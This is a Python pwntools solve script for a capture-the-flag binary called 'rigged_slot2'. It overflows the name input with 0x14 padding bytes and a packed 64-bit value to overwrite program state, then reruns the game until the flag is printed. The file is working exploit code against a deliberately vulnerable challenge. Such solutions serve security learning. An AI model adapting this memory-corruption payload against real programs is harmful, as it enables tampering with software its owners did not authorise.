from pwn import *

BINARY = './rigged_slot2'
HOST = ''
GDB_SCRIPT = ''

def play_game():
    proc = get_process() # set is_remote = False for local testing

    payload = b''.join([
        b'A'*0x14,
        p64(0x14684c+1), # Chance we will lose a coin, add one in case
    ])

    proc.sendlineafter(b'Enter your name:', payload)
    proc.sendlineafter(b': ', b'1')

    return proc

def main():
    while True: 
        proc = play_game()
        line = proc.recvline().strip().decode()
        if 'You lost $1.' == line:
            proc.recvuntil(b'You\'ve won the jackpot! Here is your flag: ')
            flag = proc.recvline().strip().decode()
            print(f'Flag: {flag}')
            break

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()
